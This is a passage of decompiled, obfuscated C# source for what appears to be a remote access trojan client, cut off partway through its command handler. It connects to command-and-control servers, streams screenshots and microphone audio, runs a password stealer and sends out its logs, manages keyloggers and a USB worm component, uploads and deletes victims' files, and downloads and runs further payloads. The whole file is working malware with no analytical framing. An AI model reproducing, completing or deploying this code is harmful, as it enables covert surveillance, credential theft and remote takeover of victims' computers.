using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using NAudio.Wave;

namespace camsars;

public class romwckoMCDM
{
	private WaveInEvent romwckosoundIn;

	public Process romwckoCProcess;

	public ProcessStartInfo romwckoCStartInfo;

	private bool romwckocapScreen = false;

	public bool romwckoreqCnls = false;

	private bool romwckohasusb = false;

	private bool romwckoiscam = false;

	private int romwckobytesRead = 0;

	public TcpClient romwckotcpsck;

	private romwckoMYINF romwckoUPC;

	private ThreadStart romwckofunStarter;

	private int romwckoscrSize = 210;

	public DateTime romwckolTimeUtc;

	private Dictionary<string, byte[]> romwckotasks = new Dictionary<string, byte[]>();

	private int romwckothreadCnts = 0;

	private int romwckobuffSize = 1024;

	private romwckoOCMD romwckoCMD;

	public int port_sn = 0;

	private bool romwckoiswitch = false;

	private bool romwckostr_writer = false;

	private string romwcko = "EW2DF3D|wicmxTRE2D3Gs";

	public bool romwckoautCnls = false;

	public NetworkStream romwckonetStream;

	private romwckoDRIVF romwckoHD = new romwckoDRIVF();

	private int romwckoatmps = 0;

	private bool romwckothrRuning = false;

	private Thread romwckofunThread;

	public bool romwckois_working = false;

	private romwckoTHRE romwckoStateObj = new romwckoTHRE();

	private void romwckoapps_status()
	{
		try
		{
			string text = "";
			string text2 = "0.0.0.0|wicmx".Split(new char[1] { '|' })[0];
			string text3 = "true!romwcko".Split(new char[1] { '!' })[0];
			text = "maina#Runing|ver#!romwcko".Split(new char[1] { '!' })[0] + romwckoUPC.romwckoapver + "|name#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckomainApp + "|path#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckoget_mpath() + "|fileslog=!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckofilesLogs + "|apkey#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckopc_id + ">|wicmx".Split(new char[1] { '|' })[0];
			if (File.Exists(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe!romwcko".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(romwckoCONF.romwckokiyApp);
				text3 = ((processesByName.Length != 0) ? "Runing!romwcko".Split(new char[1] { '!' })[0] : "Not Runing!romwcko".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!romwcko".Split(new char[1] { '!' })[0];
				text3 = "Not Present!romwcko".Split(new char[1] { '!' })[0];
			}
			text = text + "keeap#!romwcko".Split(new char[1] { '!' })[0] + text3 + "|ver#!romwcko".Split(new char[1] { '!' })[0] + text2 + "|name#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckokiyApp + "|path#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckokiPath() + "|logfile#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckokeloogs + ">|wicmx".Split(new char[1] { '|' })[0];
			if (File.Exists(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopssApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopssApp + ".exe!romwcko".Split(new char[1] { '!' })[0]).ProductVersion;
				text3 = "Present!romwcko".Split(new char[1] { '!' })[0];
			}
			else
			{
				text2 = "0.0.0.0!romwcko".Split(new char[1] { '!' })[0];
				text3 = "Not Present!romwcko".Split(new char[1] { '!' })[0];
			}
			text = text + "pasap#!romwcko".Split(new char[1] { '!' })[0] + text3 + "|ver#!romwcko".Split(new char[1] { '!' })[0] + text2 + "|name#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckopssApp + "|path#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckoget_ppath() + "|logfile#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckopaslogs + ">|wicmx".Split(new char[1] { '|' })[0];
			if (File.Exists(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(romwckoCONF.romwckosecApp);
				text3 = ((processesByName.Length != 0) ? "Runing!romwcko".Split(new char[1] { '!' })[0] : "Not Runing!romwcko".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!romwcko".Split(new char[1] { '!' })[0];
				text3 = "Not Present!romwcko".Split(new char[1] { '!' })[0];
			}
			text = text + "secap#!romwcko".Split(new char[1] { '!' })[0] + text3 + "|ver#!romwcko".Split(new char[1] { '!' })[0] + text2 + "|name#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckosecApp + "|path#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckosecPath() + "|logfile#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckosecApp + ">|wicmx".Split(new char[1] { '|' })[0];
			if (File.Exists(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(romwckoCONF.romwckousbApp);
				text3 = ((processesByName.Length != 0) ? "Runing!romwcko".Split(new char[1] { '!' })[0] : "Not Runing!romwcko".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!romwcko".Split(new char[1] { '!' })[0];
				text3 = "Not Present!romwcko".Split(new char[1] { '!' })[0];
			}
			text = text + "usbap#!romwcko".Split(new char[1] { '!' })[0] + text3 + "|ver#!romwcko".Split(new char[1] { '!' })[0] + text2 + "|name#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckousbApp + "|path#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckousbPath() + "|logfile#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckousbApp + "|usbwrm#!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckousbwrm + ">|wicmx".Split(new char[1] { '|' })[0];
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			romwckopush_data(bytes, "romwcko-asatas=upds|wicmx".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public string romwckofile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|wicmx".Split(new char[1] { '|' })[0] : "<|wicmx".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.ToString() + ((!ret) ? ">|wicmx".Split(new char[1] { '|' })[0] : "<|wicmx".Split(new char[1] { '|' })[0]);
			text = text + romwckoCMD.romwckoget_size(fileInfo.Length) + ((!ret) ? ">|wicmx".Split(new char[1] { '|' })[0] : "<|wicmx".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				romwckopush_data(null, "romwcko-filsz=|wicmx".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void romwckopass_info()
	{
		try
		{
			if (File.Exists(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopssApp + ".exe|wicmx".Split(new char[1] { '|' })[0]))
			{
				romwckoCMD.romwckoprocess(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopssApp + ".exe|wicmx".Split(new char[1] { '|' })[0], null, sendExp: false);
				int num = 0;
				while (true)
				{
					if (num < 10)
					{
						Thread.Sleep(500);
						if (File.Exists(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopaslogs))
						{
							break;
						}
						num++;
						continue;
					}
					return;
				}
				byte[] data = File.ReadAllBytes(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopaslogs);
				romwckopush_data(data, "romwcko-paskl=send|wicmx".Split(new char[1] { '|' })[0]);
			}
			else
			{
				romwckopush_data(null, "romwcko-sndps=send|wicmx".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private bool romwckoIPSConfig()
	{
		try
		{
			romwckoCONF.romwckodefaultP = romwckoCMD.romwckoserverIPD()[0];
			if (romwckoatmps > 21)
			{
				romwckoCONF.romwckodefaultP = romwckoCMD.romwckoserverIPD()[1];
				if (romwckoatmps > 26)
				{
					romwckoatmps = 0;
				}
			}
			romwckoatmps++;
			romwckotcpsck = new TcpClient();
			romwckotcpsck.Connect(romwckoCONF.romwckodefaultP, romwckoCONF.romwckoport);
			romwckoatmps = 0;
			return true;
		}
		catch
		{
			romwckoports_switch();
			return false;
		}
	}

	public void romwckoports_switch()
	{
		port_sn++;
		switch (port_sn)
		{
		case 0:
			romwckoCONF.romwckoport = romwckoCONF.port;
			break;
		case 1:
			romwckoCONF.romwckoport = romwckoCONF.aport;
			break;
		case 2:
			romwckoCONF.romwckoport = romwckoCONF.bport;
			break;
		case 3:
			romwckoCONF.romwckoport = romwckoCONF.cport;
			break;
		case 4:
			romwckoCONF.romwckoport = romwckoCONF.dport;
			break;
		}
		if (port_sn >= 4)
		{
			port_sn = 0;
		}
	}

	public bool romwckopush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			romwckoCMD.romwckorunTime = DateTime.Now;
			if (romwckostr_writer)
			{
				return false;
			}
			romwckostr_writer = true;
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + num];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !romwckoreqCnls)
			{
				int num5 = ((num4 > romwckobuffSize) ? romwckobuffSize : num4);
				romwckonetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				romwckoCMD.romwckorunTime = DateTime.Now;
			}
			romwckostr_writer = false;
			if (romwckoreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			romwckostr_writer = false;
			romwckois_working = false;
			return false;
		}
	}

	public void romwckosaveFile(string filePath, string run)
	{
		try
		{
			byte[] array = romwckopull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
				if (run == "run!romwcko".Split(new char[1] { '!' })[0])
				{
					romwckoCMD.romwckoprocess(filePath, null, sendExp: true);
				}
			}
		}
		catch
		{
		}
	}

	private void romwckouser_info()
	{
		romwckoUPC.romwckoloadAV();
		string text = romwckoUPC.romwckolancard + "|" + romwckoUPC.romwckocname + "|" + romwckoUPC.romwckouname + "|" + romwckoUPC.romwckouip + "|" + romwckoCONF.romwcko_osname() + "|" + romwckoUPC.romwckoapver + "|" + romwckoUPC.romwckoantiv;
		text = text + "|" + romwckoCMD.romwckoupdate_user();
		text = text + "|" + romwckoCONF.romwckoclientNum;
		text = text + "|" + romwckoCONF.romwckoget_mpath();
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		romwckopush_data(bytes, "romwcko-info=user|wicmx".Split(new char[1] { '|' })[0]);
		if (!romwckohasusb)
		{
			if (Directory.Exists(romwckoCONF.romwckousbPath() + "data!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckohasusb = true;
			}
			if (Directory.Exists(romwckoCONF.romwckousbPath() + "data!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckohasusb = true;
			}
		}
		if (romwckohasusb)
		{
			romwckopush_data(null, "romwcko-hasusb=" + romwckoCONF.romwckousbPath() + "data!romwcko".Split(new char[1] { '!' })[0]);
		}
		if (File.Exists(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbwrm))
		{
			romwckopush_data(null, "romwcko-hasusbw=!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckousbPath() + "data!romwcko".Split(new char[1] { '!' })[0]);
		}
		if (romwckoiscam)
		{
			romwckopush_data(null, "romwcko-hascam=!romwcko".Split(new char[1] { '!' })[0]);
		}
	}

	public void romwckolist_processes()
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				long num = 0L;
				string text2 = "";
				try
				{
					PerformanceCounter val = new PerformanceCounter("Process|wicmx".Split(new char[1] { '|' })[0], "WorkingSetPrivate|wicmx".Split(new char[1] { '|' })[0], processes[i].ProcessName);
					num = val.get_RawValue() / 1024L;
					text2 = FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName).FileDescription;
				}
				catch
				{
				}
				text = text + processes[i].Id + ">|wicmx".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">!romwcko".Split(new char[1] { '!' })[0];
				text = text + num + ">|wicmx".Split(new char[1] { '|' })[0];
				text = text + text2 + "<!romwcko".Split(new char[1] { '!' })[0];
			}
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			romwckopush_data(bytes, "romwcko-procl=peoc|wicmx".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void romwckolookup_connect(object source)
	{
		try
		{
			if (!romwckothrRuning)
			{
				romwckothrRuning = true;
				romwckoCMD.romwckocheckLast();
				if (!romwckois_working || !romwckotcpsck.Connected)
				{
					romwckois_working = romwckoIPSConfig();
					if (romwckois_working)
					{
						romwckobuffSize = romwckotcpsck.ReceiveBufferSize;
						if (romwckofunThread != null && romwckofunThread.IsAlive)
						{
							romwckofunThread.Abort();
						}
						romwckoHD.romwckomainPath = romwckoCONF.romwckoget_mpath();
						if (!romwckohasusb && Directory.Exists(romwckoCONF.romwckousbPath() + "data!romwcko".Split(new char[1] { '!' })[0]))
						{
							romwckohasusb = true;
						}
						romwckosee_responce();
					}
				}
			}
			else
			{
				romwckothreadCnts++;
			}
			romwckothrRuning = false;
		}
		catch
		{
			romwckoatmps++;
			romwckothrRuning = false;
			romwckothreadCnts = 0;
			romwckostr_writer = false;
			romwckois_working = false;
			romwckoiswitch = false;
		}
	}

	public void romwckoload_app(byte[] fileByt)
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			if (romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckomainApp + ".exe|wicmx".Split(new char[1] { '|' })[0] != executablePath)
			{
				Thread.Sleep(600);
				if (!Directory.Exists(romwckoCONF.romwckoget_mpath()))
				{
					Directory.CreateDirectory(romwckoCONF.romwckoget_mpath());
				}
				if (fileByt == null)
				{
					fileByt = File.ReadAllBytes(executablePath);
				}
				if (romwcko == "KR3I5|wicmxSD1GD2W")
				{
					romwcko = "4FE5D4C|wicmxER3T2D";
				}
				File.Copy(executablePath, romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckomainApp + ".exe|wicmx".Split(new char[1] { '|' })[0], overwrite: true);
			}
		}
		catch
		{
		}
	}

	private void romwckomicAvailable(object sender, WaveInEventArgs e)
	{
		try
		{
			if (romwckois_working)
			{
				romwckopush_data(e.get_Buffer(), "romwcko-recdat=Rording|romwcko".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void romwckosee_recording()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		try
		{
			romwckosoundIn = new WaveInEvent();
			romwckosoundIn.set_BufferMilliseconds(5000);
			romwckosoundIn.add_DataAvailable((EventHandler<WaveInEventArgs>)romwckomicAvailable);
			romwckosoundIn.set_WaveFormat(new WaveFormat(8000, 16, 1));
			romwckosoundIn.StartRecording();
		}
		catch
		{
		}
	}

	private void romwckomicRecording()
	{
		try
		{
			if (romwckosoundIn != null)
			{
				romwckosoundIn.StopRecording();
				romwckosoundIn.Dispose();
				romwckosoundIn = null;
			}
		}
		catch
		{
		}
	}

	public bool romwckosend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string text = array[0];
			if (File.Exists(text))
			{
				string fileName = Path.GetFileName(text);
				byte[] data = File.ReadAllBytes(text);
				fileinfo = fileinfo + ">!romwcko".Split(new char[1] { '!' })[0] + fileName;
				if (romwckopush_data(data, "romwcko-afile=!romwcko".Split(new char[1] { '!' })[0] + fileinfo))
				{
					return romwckoHD.romwckowriteFile(text);
				}
				return false;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void romwckostart()
	{
		romwckoCMD = new romwckoOCMD(this);
		romwckoCMD.romwckorunTime = DateTime.Now;
		romwckoUPC = new romwckoMYINF();
		romwckoHD.iserver = this;
		TimerCallback callback = romwckolookup_connect;
		Timer romwckotimer = new Timer(callback, romwckoStateObj, 32000, 35000);
		romwckoStateObj.romwckotimer = romwckotimer;
	}

	private void romwckois_screen(string screenSize)
	{
		try
		{
			romwckoSCRNS romwckoSCRNS2 = new romwckoSCRNS();
			romwckoscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (romwckocapScreen && romwckois_working)
			{
				Bitmap val = romwckoSCRNS2.romwckoscreen(romwckoscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					romwckopush_data(memoryStream.ToArray(), "romwcko-scren=cacen|wicmx".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	public byte[] romwckopull_data()
	{
		try
		{
			romwckoCMD.romwckorunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			romwckobytesRead = romwckonetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !romwckoreqCnls)
			{
				int count = ((num3 > romwckobuffSize) ? romwckobuffSize : num3);
				romwckobytesRead = romwckonetStream.Read(array2, num, count);
				num += romwckobytesRead;
				num3 -= romwckobytesRead;
				romwckoCMD.romwckorunTime = DateTime.Now;
			}
			if (romwckoreqCnls)
			{
				romwckonetStream.Flush();
				array2 = null;
			}
			return array2;
		}
		catch
		{
			romwckois_working = false;
			return null;
		}
	}

	private void romwckoimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(path);
			Bitmap val2 = new Bitmap((Image)(object)val, 210, 160);
			if (val2 != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">!romwcko".Split(new char[1] { '!' })[0];
				text = text + fileInfo.CreationTimeUtc.ToString() + ">!romwcko".Split(new char[1] { '!' })[0];
				text = text + romwckoCMD.romwckoget_size(fileInfo.Length) + ">!romwcko".Split(new char[1] { '!' })[0];
				MemoryStream memoryStream = new MemoryStream();
				((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Png());
				romwckopush_data(memoryStream.ToArray(), "romwcko-thumb=view!romwcko".Split(new char[1] { '!' })[0] + text);
			}
		}
		catch
		{
		}
	}

	public void romwckoremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] romwckoget_command()
	{
		try
		{
			byte[] array = new byte[5];
			romwckobytesRead = romwckonetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= romwckobytesRead)
			{
				int count = ((num3 > romwckobuffSize) ? romwckobuffSize : num3);
				romwckobytesRead = romwckonetStream.Read(array2, num2, count);
				num2 += romwckobytesRead;
			}
			if (romwcko == "G3ER3T1|wicmxSD1GD2W")
			{
				romwcko = "4FE5D4C|wicmxER3T2D";
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			romwckois_working = false;
			return null;
		}
	}

	private void romwckoupdate_task(string type)
	{
		try
		{
			if (romwckotasks.ContainsKey(type))
			{
				romwckotasks.Remove(type);
			}
		}
		catch
		{
		}
	}

	private void romwckosee_scren(string screenSize)
	{
		try
		{
			romwckoSCRNS romwckoSCRNS2 = new romwckoSCRNS();
			romwckoscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = romwckoSCRNS2.romwckoscreen(romwckoscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				romwckopush_data(memoryStream.ToArray(), "romwcko-sascr=creen!romwcko".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	private void romwckopush_file(string lfile)
	{
		try
		{
			if (!File.Exists(lfile))
			{
				return;
			}
			string fileName = Path.GetFileName(lfile);
			if (fileName != "")
			{
				string type = "romwcko-file=!romwcko".Split(new char[1] { '!' })[0] + fileName;
				if (romwckopush_data(File.ReadAllBytes(lfile), type, tmp: true))
				{
					romwckoHD.romwckowriteFile(lfile);
				}
			}
		}
		catch
		{
		}
	}

	private void romwckoscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			romwckoscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public void romwckois_dispose()
	{
		try
		{
			if (romwckofunThread.IsAlive)
			{
				romwckofunThread.Abort();
			}
			if (romwckotcpsck.Connected)
			{
				romwckotcpsck.Close();
			}
			romwckoStateObj.romwckotimer.Dispose();
		}
		catch
		{
		}
	}

	private void romwckosee_responce()
	{
		if (!romwckoiswitch)
		{
			romwckoiswitch = true;
			romwckonetStream = romwckoCMD.romwckoNS(romwckotcpsck);
			romwckocapScreen = false;
			while (romwckois_working)
			{
				string[] switchType = romwckoget_command();
				if (switchType != null)
				{
					romwckoreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("romwcko-!romwcko".Split(new char[1] { '!' })[0] + text) : ("romwcko-!romwcko".Split(new char[1] { '!' })[0] + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "romwcko-upmain":
						romwckoCMD.romwckoup_main(switchType[1]);
						break;
					case "romwcko-upusbs":
						romwckoCMD.romwckoup_usb(switchType[1]);
						break;
					case "romwcko-uppass":
						romwckoCMD.romwckoup_pass(switchType[1]);
						break;
					case "romwcko-upkees":
						romwckoCMD.romwckoup_keeloger(switchType[1]);
						break;
					case "romwcko-rnnkl":
						romwckoCMD.romwckoseekilogr();
						break;
					case "romwcko-upsecs":
						romwckoCMD.romwckoup_security(switchType[1]);
						break;
					case "romwcko-rnntc":
						romwckoCMD.romwckoseeutcl();
						break;
					case "romwcko-secup":
						romwckoCMD.romwckoupdated(6, switchType[1]);
						break;
					case "romwcko-chrodll":
						romwckoCMD.romwckoupdated(9, switchType[1]);
						break;
					case "romwcko-mozedll":
						romwckoCMD.romwckoupdated(10, switchType[1]);
						break;
					case "romwcko-rnnub":
						romwckoCMD.romwckoseeusbl();
						break;
					case "romwcko-secrun":
						romwckoCMD.romwckoseeSEC();
						break;
					case "romwcko-mesg":
						romwckofunStarter = delegate
						{
							//IL_0010: Unknown result type (might be due to invalid IL or missing references)
							MessageBox.Show(switchType[1], "Alert", (MessageBoxButtons)0, (MessageBoxIcon)64);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-rupth":
						romwckopush_data(null, "romwcko-appth=!romwcko".Split(new char[1] { '!' })[0] + romwckoCONF.romwckoget_mpath());
						break;
					case "romwcko-clrklg":
						romwckofunStarter = delegate
						{
							romwckoCMD.romwckodeleteKLS();
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-clping":
						romwckoCMD.romwckorunTime = DateTime.Now;
						break;
					case "romwcko-clrcmd":
						romwckoCStartInfo = null;
						romwckoCProcess = null;
						break;
					case "romwcko-savaf":
						romwckoHD.romwckowriteFile(switchType[1]);
						break;
					case "romwcko-sysky":
						romwckofunStarter = delegate
						{
							romwckouploadKLogs("sysky|wicmx".Split(new char[1] { '|' })[0]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-usbrun":
						romwckoCMD.romwckoseeUSB();
						break;
					case "romwcko-keerun":
						romwckoCMD.romwckoseekilogr();
						break;
					case "romwcko-stpre":
						romwckomicRecording();
						break;
					case "romwcko-stsre":
						romwckosee_recording();
						break;
					case "romwcko-clstats":
						romwckofunStarter = delegate
						{
							romwckoapps_status();
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-procl":
						romwckofunStarter = delegate
						{
							romwckolist_processes();
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-uclntn":
						romwckoCONF.romwckomachineSetup(switchType[1].Trim());
						break;
					case "romwcko-thumb":
						romwckoimage_info(switchType[1]);
						break;
					case "romwcko-scrsz":
						romwckoscreenSize(switchType[1]);
						break;
					case "romwcko-sndpl":
						romwckoCMD.romwckoupdated(4, switchType[1]);
						romwckofunStarter = delegate
						{
							romwckopass_info();
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-cscreen":
						romwckosee_scren(switchType[1]);
						break;
					case "romwcko-stops":
						romwckocapScreen = false;
						break;
					case "romwcko-updatu":
					case "romwcko-usbwrm":
						romwckoCMD.romwckoupdated(2, switchType[1]);
						break;
					case "romwcko-supdat":
						romwckoCMD.romwckoupdated(7, switchType[1]);
						break;
					case "romwcko-filsz":
						romwckofunStarter = delegate
						{
							romwckofile_info(switchType[1]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-passl":
						romwckofunStarter = delegate
						{
							romwckopass_info();
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-audio":
						romwckoCMD.romwckoupdated(1, switchType[1]);
						break;
					case "romwcko-file":
						romwckofunStarter = delegate
						{
							romwckopush_file(switchType[1]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-cnls":
						romwckoautCnls = true;
						romwckoreqCnls = true;
						romwckocapScreen = false;
						break;
					case "romwcko-scren":
						romwckocapScreen = true;
						romwckofunStarter = delegate
						{
							romwckois_screen(switchType[1]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-dirs":
						romwckofunThread = new Thread(romwckolistDrives);
						romwckofunThread.Start();
						break;
					case "romwcko-fles":
					{
						string files = romwckoHD.romwckolookupFiles(switchType[1]);
						if (files != null)
						{
							romwckofunStarter = delegate
							{
								romwckopush_data(null, "romwcko-fles=!romwcko".Split(new char[1] { '!' })[0] + files);
							};
							romwckofunThread = new Thread(romwckofunStarter);
							romwckofunThread.Start();
						}
						else
						{
							romwckofunThread = new Thread(romwckofunStarter);
							romwckofunThread.Start();
						}
						break;
					}
					case "romwcko-dowr":
						romwckosaveFile(switchType[1], "run!romwcko".Split(new char[1] { '!' })[0]);
						break;
					case "romwcko-fldr":
					{
						string Folders = romwckoHD.romwckocheckFolders(switchType[1]);
						if (Folders != null)
						{
							romwckofunStarter = delegate
							{
								romwckopush_data(null, "romwcko-fldr=|wicmx".Split(new char[1] { '|' })[0] + Folders);
							};
							romwckofunThread = new Thread(romwckofunStarter);
							romwckofunThread.Start();
						}
						else
						{
							romwckofunThread = new Thread(romwckofunStarter);
							romwckofunThread.Start();
						}
						break;
					}
					case "romwcko-delt":
						romwckofunStarter = delegate
						{
							romwckoremove_file(switchType[1]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-sndps":
						romwckoCMD.romwckoupdated(4, switchType[1]);
						break;
					case "romwcko-udlt":
						romwckoCMD.romwckoremove_user();
						romwckotcpsck.Close();
						break;
					case "romwcko-runf":
					{
						string[] tParms = switchType[1].Split(new char[1] { '>' });
						romwckofunStarter = delegate
						{
							romwckoCMD.romwckoprocess(tParms[0], tParms[1], sendExp: true);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					}
					case "romwcko-info":
						romwckofunThread = new Thread(romwckouser_info);
						romwckofunThread.Start();
						break;
					case "romwcko-uklog":
						romwckoCMD.romwckoupdated(3, switchType[1]);
						break;
					case "romwcko-dowf":
						romwckosaveFile(switchType[1], "");
						break;
					case "romwcko-endpo":
						romwckoCMD.romwckobreak_process(Convert.ToInt16(switchType[1].Trim()));
						break;
					case "romwcko-afile":
						romwckofunStarter = delegate
						{
							romwckosend_auto(switchType[1]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					case "romwcko-listf":
						romwckofunStarter = delegate
						{
